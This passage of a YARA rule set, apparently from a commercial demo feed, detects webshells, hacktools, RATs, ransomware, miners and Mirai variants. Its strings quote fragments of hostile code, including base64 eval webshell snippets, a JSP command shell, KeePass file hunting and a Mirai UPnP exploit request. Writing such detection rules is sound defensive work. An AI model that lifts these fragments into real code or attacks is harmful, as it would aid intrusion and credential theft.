      tags = "APT, DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "eval(" ascii wide
   condition: 
      ( uint16 ( 0 ) == 0x3f3c or uint16 ( 0 ) == 0x253c ) and filesize < 40 and $x1
} 

rule APT_WebShell_AUS_Tiny_2_RID2F47 : APT DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detetcs a tiny webshell involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 11:50:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Request.Item[System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(\"[password]\"))];" ascii
      $x2 = "eval(arguments,System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(\"" ascii
   condition: 
      ( uint16 ( 0 ) == 0x3f3c or uint16 ( 0 ) == 0x253c ) and filesize < 1KB and 1 of them
} 

rule APT_WebShell_AUS_JScript_3_RID3063 : APT DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detetcs a webshell involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 12:37:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<%@ Page Language=\"Jscript\" validateRequest=\"false\"%><%try{eval(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String" ascii
      $s2 = ".Item[\"[password]\"])),\"unsafe\");}" ascii
   condition: 
      uint16 ( 0 ) == 0x6568 and filesize < 1KB and all of them
} 

rule APT_WebShell_AUS_4_RID2D46 : APT DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detetcs a webshell involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 10:24:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "wProxy.Credentials = new System.Net.NetworkCredential(pusr, ppwd);" fullword ascii
      $s2 = "{return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(" ascii
      $s3 = ".Equals('User-Agent', StringComparison.OrdinalIgnoreCase))" ascii
      $s4 = "gen.Emit(System.Reflection.Emit.OpCodes.Ret);" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x7566 and filesize < 10KB and 3 of them
} 

rule APT_Script_AUS_4_RID2CA5 : APT DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detetcs a script involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 09:58:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "myMutex = CreateMutex(0, 1, \"teX23stNew\")" fullword ascii
      $x2 = "mmpath = Environ(appdataPath) & \"\\\" & \"Microsoft\" & \"\\\" & \"mm.accdb\"" fullword ascii
      $x3 = "Dim mmpath As String, newmmpath  As String, appdataPath As String" fullword ascii
      $x4 = "'MsgBox \"myMutex Created\" Do noting" fullword ascii
      $x5 = "appdataPath = \"app\" & \"DatA\"" fullword ascii
      $x6 = ".DoCmd.Close , , acSaveYes" fullword ascii
   condition: 
      filesize < 7KB and 1 of them
} 

rule APT_WebShell_AUS_5_RID2D47 : APT DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detetcs a webshell involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 10:25:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "function DEC(d){return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(d));}" fullword ascii
      $a2 = "function ENC(d){return Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(d));}" fullword ascii
      $s1 = "var hash=DEC(Request.Item['" ascii
      $s2 = "Response.Write(ENC(SET_ASS_SUCCESS));" fullword ascii
      $s3 = "hashtable[hash] = assCode;" fullword ascii
      $s4 = "Response.Write(ss);" fullword ascii
      $s5 = "var hashtable = Application[CachePtr];" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x7566 and filesize < 2KB and 4 of them
} 

rule HKTL_PowerKatz_Feb19_1_RID2EB0 : DEMO HKTL T1136 {
   meta:
      description = "Detetcs a tool used in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 11:25:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Powerkatz32" ascii wide fullword
      $x2 = "Powerkatz64" ascii wide
      $s1 = "GetData: not found taskName" fullword ascii wide
      $s2 = "GetRes Ex:" fullword ascii wide
   condition: 
      1 of ( $x* ) and 1 of ( $s* )
} 

rule HKTL_Unknown_Feb19_1_RID2DF9 : DEMO HKTL T1136 {
   meta:
      description = "Detetcs a tool used in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 10:54:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "not a valid timeout format!" ascii wide fullword
      $x2 = "host can not be empty!" ascii wide fullword
      $x3 = "not a valid port format!" ascii wide fullword
      $x4 = "{0} - {1} TTL={2} time={3}" ascii wide fullword
      $x5 = "ping count is not a correct format!" ascii wide fullword
      $s1 = "The result is too large,program store to '{0}'.Please download it manully." fullword ascii wide
      $s2 = "C:\\Windows\\temp\\" ascii wide
   condition: 
      1 of ( $x* ) or 2 of them
} 

rule SUSP_EnableContent_String_Gen_RID322C : DEMO FILE GEN SUSP T1136 T1193 T1203 {
   meta:
      description = "Detects suspicious string that asks to enable active content in Office Doc"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-02-12 13:53:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, GEN, SUSP, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $e1 = "Enable Editing" fullword ascii
      $e2 = "Enable Content" fullword ascii
      $e3 = "Enable editing" fullword ascii
      $e4 = "Enable content" fullword ascii
   condition: 
      uint16 ( 0 ) == 0xcfd0 and ( $e1 in ( 0 .. 3000 ) or $e2 in ( 0 .. 3000 ) or $e3 in ( 0 .. 3000 ) or $e4 in ( 0 .. 3000 ) or 2 of them )
} 

rule SUSP_WordDoc_VBA_Macro_Strings_RID323F : DEMO FILE SCRIPT SUSP T1136 T1193 T1203 {
   meta:
      description = "Detects suspicious strings in Word Doc that indcate malicious use of VBA macros"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-02-12 13:57:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, SUSP, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "\\Microsoft Shared\\" ascii
      $a2 = "\\VBA\\" ascii
      $a3 = "Microsoft Office Word" fullword ascii
      $a4 = "PROJECTwm" fullword wide
      $s1 = "AppData" fullword ascii
      $s2 = "Document_Open" fullword ascii
      $s3 = "Project1" fullword ascii
      $s4 = "CreateObject" fullword ascii
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 800KB and all of them
} 

rule MAL_ExileRAT_Feb19_1_RID2D8E : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Exile RAT"
      author = "Florian Roth"
      reference = "https://blog.talosintelligence.com/2019/02/exilerat-shares-c2-with-luckycat.html"
      date = "2019-02-04 10:36:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "Content-Disposition:form-data;name=\"x.bin\"" fullword ascii
      $s1 = "syshost.dll" fullword ascii
      $s2 = "\\scout\\Release\\scout.pdb" ascii
      $s3 = "C:\\data.ini" fullword ascii
      $s4 = "my-ip\" value=\"" fullword ascii
      $s5 = "ver:%d.%d.%d" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == "da8475fc7c3c90c0604ce6a0b56b5f21" or 3 of them )
} 

rule SUSP_Katz_PDB_RID2B8A : DEMO EXE FILE SUSP {
   meta:
      description = "Detects suspicious PDB in file"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-02-04 09:10:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, SUSP"
      minimum_yara = "2.2.0"
      
   strings:
      $s1 = /\\Release\\[a-z]{0,8}katz.pdb/ 
      $s2 = /\\Debug\\[a-z]{0,8}katz.pdb/ 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and all of them
} 

rule PUA_CryptoMiner_Jan19_1_RID2F44 : DEMO MAL T1136 {
   meta:
      description = "Detects Crypto Miner strings"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-01-31 11:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Stratum notify: invalid Merkle branch" fullword ascii
      $s2 = "-t, --threads=N       number of miner threads (default: number of processors)" fullword ascii
      $s3 = "User-Agent: cpuminer/" ascii
      $s4 = "hash > target (false positive)" fullword ascii
      $s5 = "thread %d: %lu hashes, %s khash/s" fullword ascii
   condition: 
      filesize < 1000KB and 1 of them
} 

rule APT_MAL_DNS_Hijacking_Campaign_AA19_024A_RID345A : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware used in DNS Hijackign campaign"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/AA19-024A"
      date = "2019-01-25 15:26:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "/Client/Login?id=" fullword ascii
      $s3 = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" fullword ascii
      $s4 = ".\\Configure.txt" fullword ascii
      $s5 = "Content-Disposition: form-data; name=\"files\"; filename=\"" fullword ascii
      $s6 = "Content-Disposition: form-data; name=\"txts\"" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them
} 

rule SUSP_RTF_Header_Anomaly_RID2F7F : DEMO FILE SUSP {
   meta:
      description = "Detects malformed RTF header often used to trick mechanisms that check for a full RTF header"
      author = "Florian Roth"
      reference = "https://twitter.com/ItsReallyNick/status/975705759618158593"
      date = "2019-01-20 11:59:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP"
      minimum_yara = "1.7"
      
   condition: 
      uint32 ( 0 ) == 0x74725c7b and not uint8 ( 4 ) == 0x66
} 

rule Webshell_Tiny_ASP_Jan19_1_RID2FFF : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detects a Tiny ASP webshell"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-01-16 12:21:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Execute Request" ascii wide nocase
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 150 and 1 of them
} 

rule MAL_CrypRAT_Jan19_1_RID2D41 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects CrypRAT"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-01-07 10:24:01"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "Cryp_RAT" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == "2524e5e9fe04d7bfe5efb3a5e400fe4b" or 1 of them )
} 

rule SUSP_Putty_Unnormal_Size_RID3086 : ANOMALY DEMO EXE FILE SUSP T1021 T1136 {
   meta:
      description = "Detects a putty version with a size different than the one provided by Simon Tatham (could be caused by an additional signature or malware)"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-01-07 12:43:31"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "ANOMALY, DEMO, EXE, FILE, SUSP, T1021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "SSH, Telnet and Rlogin client" fullword wide
      $v1 = "Release 0.6" wide
      $v2 = "Release 0.70" wide
      $fp1 = "KiTTY fork" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and $s1 and 1 of ( $v* ) and not 1 of ( $fp* ) and filesize != 524288 and filesize != 495616 and filesize != 483328 and filesize != 524288 and filesize != 712176 and filesize != 828400 and filesize != 569328 and filesize != 454656 and filesize != 531368 and filesize != 524288 and filesize != 483328 and filesize != 713592 and filesize != 829304 and filesize != 571256 and filesize != 774200 and filesize != 854072 and filesize != 665144 and filesize != 774200 and filesize != 854072 and filesize != 665144
} 

rule SUSP_JAVA_Class_with_VBS_Content_RID32D1 : DEMO FILE SCRIPT SUSP T1136 {
   meta:
      description = "Detects a JAVA class file with strings known from VBS files"
      author = "Florian Roth"
      reference = "https://www.menlosecurity.com/blog/a-jar-full-of-problems-for-financial-services-companies"
      date = "2019-01-03 14:21:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "java/lang/String" ascii
      $s1 = ".vbs" ascii
      $s2 = "createNewFile" fullword ascii
      $s3 = "wscript" fullword ascii nocase
   condition: 
      uint16 ( 0 ) == 0xfeca and filesize < 100KB and $a1 and 3 of ( $s* )
} 

rule MAL_Ryuk_Ransomware_RID2E73 : CRIME DEMO EXE FILE MAL RANSOM T1136 {
   meta:
      description = "Detects strings known from Ryuk Ransomware"
      author = "Florian Roth"
      reference = "https://research.checkpoint.com/ryuk-ransomware-targeted-campaign-break/"
      date = "2018-12-31 11:15:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CRIME, DEMO, EXE, FILE, MAL, RANSOM, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "/v \"svchos\" /f" fullword wide
      $x2 = "\\Documents and Settings\\Default User\\finish" fullword wide
      $x3 = "\\users\\Public\\finish" fullword wide
      $x4 = "lsaas.exe" fullword wide
      $x5 = "RyukReadMe.txt" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( pe.imphash ( ) == "4a069c1abe5aca148d5a8fdabc26751e" or pe.imphash ( ) == "dc5733c013378fa418d13773f5bfe6f1" or 1 of them )
} 

rule SUSP_XMRIG_String_RID2D18 : DEMO EXE FILE SUSP T1136 {
   meta:
      description = "Detects a suspicious XMRIG crypto miner executable string in filr"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-12-28 10:17:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      nodeepdive = "1"
      tags = "DEMO, EXE, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "xmrig.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them
} 

rule APT_APT10_Malware_Imphash_Dec18_1_RID3250 : APT CHINA DEMO EXE FILE G0045 MAL {
   meta:
      description = "Detects APT10 malware based on ImpHashes"
      author = "Florian Roth"
      reference = "AlienVault OTX IOCs - statistical sample analysis"
      date = "2018-12-28 13:59:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, CHINA, DEMO, EXE, FILE, G0045, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and ( pe.imphash ( ) == "0556ff5e5f8744bff47d4921494ba46d" or pe.imphash ( ) == "cb1194123f68a68eb14552c085b620ce" or pe.imphash ( ) == "efad9ff8c0d2a6419bf1dd970bcd806d" or pe.imphash ( ) == "7a861cd9c495e1d950a43cb708a22985" or pe.imphash ( ) == "a5d0545030be75a421529c2b0be6c4bd" or pe.imphash ( ) == "94491f4a812b0297419dc888aa4fd2a5" )
} 

rule HKTL_NoPowerShell_RID2D65 : DEMO HKTL T1086 T1136 {
   meta:
      description = "Detects NoPowerShell hack tool"
      author = "Florian Roth"
      reference = "https://github.com/bitsadmin/nopowershell"
      date = "2018-12-28 10:30:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\NoPowerShell.pdb" fullword ascii
      $x2 = "Invoke-WmiMethod -Class Win32_Process -Name Create \"cmd" fullword wide
      $x3 = "ls C:\\Windows\\System32 -Include *.exe | select -First 10 Name,Length" fullword wide
      $x4 = "ls -Recurse -Force C:\\Users\\ -Include *.kdbx" fullword wide
      $x5 = "NoPowerShell.exe" fullword wide
   condition: 
      1 of them
} 

rule SUSP_Obfuscted_PowerShell_Code_RID3298 : DEMO SCRIPT SUSP T1027 T1086 T1136 {
   meta:
      description = "Detects obfuscated PowerShell Code"
      author = "Florian Roth"
      reference = "https://twitter.com/silv0123/status/1073072691584880640"
      date = "2018-12-13 14:11:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, SUSP, T1027, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "').Invoke(" ascii
      $s2 = "(\"{1}{0}\"" ascii
      $s3 = "{0}\" -f" ascii
   condition: 
      #s1 > 11 and #s2 > 10 and #s3 > 10
} 

rule SUSP_ELF_LNX_UPX_Compressed_File_RID3292 : DEMO FILE LINUX SUSP T1045 T1136 {
   meta:
      description = "Detects a suspicious ELF binary with UPX compression"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-12-12 14:10:51"
      score = 40
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, LINUX, SUSP, T1045, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = "$Id: UPX" fullword ascii
      $s3 = "$Info: This file is packed with the UPX executable packer" ascii
      $fp1 = "check your UCL installation !" 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 2000KB and filesize > 30KB and 2 of ( $s* ) and not 1 of ( $fp* )
} 

rule HKTL_Lazagne_PasswordDumper_Dec18_1_RID33E8 : DEMO EXE FILE HKTL T1003 T1086 T1136 {
   meta:
      description = "Detects password dumper Lazagne often used by middle eastern threat groups"
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group"
      date = "2018-12-11 15:07:51"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1003, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "softwares.opera(" fullword ascii
      $s2 = "softwares.mozilla(" fullword ascii
      $s3 = "config.dico(" fullword ascii
      $s4 = "softwares.chrome(" fullword ascii
      $s5 = "softwares.outlook(" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 17000KB and 1 of them
} 

rule HKTL_Lazagne_Gen_18_RID2DA6 : DEMO GEN HKTL T1003 T1136 {
   meta:
      description = "Detects Lazagne password extractor hacktool"
      author = "Florian Roth"
      reference = "https://github.com/AlessandroZ/LaZagne"
      date = "2018-12-11 10:40:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, GEN, HKTL, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "lazagne.config.powershell_execute(" fullword ascii
      $x2 = "creddump7.win32." ascii
      $x3 = "lazagne.softwares.windows.hashdump" ascii
      $x4 = ".softwares.memory.libkeepass.common(" ascii
   condition: 
      2 of them
} 

rule SUSP_Modified_SystemExeFileName_in_File_RID35F8 : DEMO EXE FILE SUSP T1136 {
   meta:
      description = "Detecst a variant of a system file name often used by attackers to cloak their activity"
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group"
      date = "2018-12-11 16:35:51"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "svchosts.exe" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 1 of them
} 

rule MAL_HawkEye_Keylogger_Gen_Dec18_RID324D : DEMO GEN MAL T1056 T1113 T1136 {
   meta:
      description = "Detects HawkEye Keylogger Reborn"
      author = "Florian Roth"
      reference = "https://twitter.com/James_inthe_box/status/1072116224652324870"
      date = "2018-12-10 13:59:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, GEN, MAL, T1056, T1113, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "HawkEye Keylogger" fullword wide
      $s2 = "_ScreenshotLogger" fullword ascii
      $s3 = "_PasswordStealer" fullword ascii
   condition: 
      2 of them
} 

rule SUSP_Scheduled_Task_BigSize_RID314A : DEMO FILE SUSP T1053 T1086 T1132 T1136 {
   meta:
      description = "Detects suspiciously big scheduled task XML file as seen in combination with embedded base64 encoded PowerShell code"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-12-06 13:16:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1053, T1086, T1132, T1136"
      minimum_yara = "1.7"
      
   strings:
      $a0 = "<Task version=" ascii wide
      $a1 = "xmlns=\"http://schemas.microsoft.com/windows/" ascii wide
      $fp1 = "</Counter><Counter>" wide
      $fp2 = "Office Feature Updates Logon" wide
      $fp3 = "Microsoft Shared" fullword wide
   condition: 
      uint16 ( 0 ) == 0xfeff and filesize > 20KB and all of ( $a* ) and not 1 of ( $fp* )
} 

rule SUSP_PiratedOffice_2007_RID2EF8 : DEMO FILE SUSP T1136 T1193 T1203 {
   meta:
      description = "Detects an Office document that was created with a pirated version of MS Office 2007"
      author = "Florian Roth"
      reference = "https://twitter.com/pwnallthethings/status/743230570440826886?lang=en"
      date = "2018-12-04 11:37:11"
      score = 40
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1136, T1193, T1203"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "<Company>Grizli777</Company>" ascii
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 300KB and all of them
} 

rule MAL_DNSPIONAGE_Malware_Nov18_RID3055 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects DNSpionage Malware"
      author = "Florian Roth"
      reference = "https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html"
      date = "2018-11-30 12:35:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = ".0ffice36o.com" fullword ascii
      $s1 = "/Client/Login?id=" fullword ascii
      $s2 = ".\\Configure.txt" fullword ascii
      $s5 = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" fullword ascii
      $s6 = "Content-Disposition: form-data; name=\"txts\"" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 2 of them )
} 

rule WebShell_JexBoss_JSP_1_RID2F20 : DEMO FILE T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Detects JexBoss JSPs"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-11-08 11:43:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "equals(\"jexboss\")" 
      $x2 = "%><pre><%if(request.getParameter(\"ppp\") != null &&" ascii
      $s1 = "<%@ page import=\"java.util.*,java.io.*\"%><pre><% if (request.getParameter(\"" 
      $s2 = "!= null && request.getHeader(\"user-agent\"" ascii
      $s3 = "String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }}%>" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x253c and filesize < 1KB and 1 of ( $x* ) or 2 of them
} 

rule WebShell_JexBoss_WAR_1_RID2F1D : DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detects JexBoss versions in WAR form"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-11-08 11:43:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $ = "jbossass" fullword ascii
      $ = "jexws.jsp" fullword ascii
      $ = "jexws.jspPK" fullword ascii
      $ = "jexws1.jsp" fullword ascii
      $ = "jexws1.jspPK" fullword ascii
      $ = "jexws2.jsp" fullword ascii
      $ = "jexws2.jspPK" fullword ascii
      $ = "jexws3.jsp" fullword ascii
      $ = "jexws3.jspPK" fullword ascii
      $ = "jexws4.jsp" fullword ascii
      $ = "jexws4.jspPK" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 4KB and 1 of them
} 

rule MAL_BackNet_Nov18_1_RID2D6D : DEMO EXE FILE MAL T1047 T1136 {
   meta:
      description = "Detects BackNet samples"
      author = "Florian Roth"
      reference = "https://github.com/valsov/BackNet"
      date = "2018-11-02 10:31:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1047, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ProcessedByFody" fullword ascii
      $s2 = "SELECT * FROM AntivirusProduct" fullword wide
      $s3 = "/C netsh wlan show profile" wide
      $s4 = "browsertornado" fullword wide
      $s5 = "Current user is administrator" fullword wide
      $s6 = "/C choice /C Y /N /D Y /T 4 & Del" wide
      $s7 = "ThisIsMyMutex-2JUY34DE8E23D7" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 2 of them
} 

rule MAL_ELF_LNX_Mirai_Oct10_1_RID2F39 : DEMO FILE LINUX MAL T1136 {
   meta:
      description = "Detects ELF Mirai variant"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-10-27 11:48:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, LINUX, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = " -r /vi/mips.bushido; " 
      $x2 = "/bin/busybox chmod 777 * /tmp/" fullword ascii
      $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s2 = "loadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s3 = "POST /cdn-cgi/" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 200KB and ( ( 1 of ( $x* ) and 1 of ( $s* ) ) or all of ( $x* ) )
} 

rule MAL_ELF_LNX_Mirai_Oct10_2_RID2F3A : DEMO FILE LINUX MAL {
   meta:
      description = "Detects ELF malware Mirai related"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-10-27 11:48:11"
      score = 75
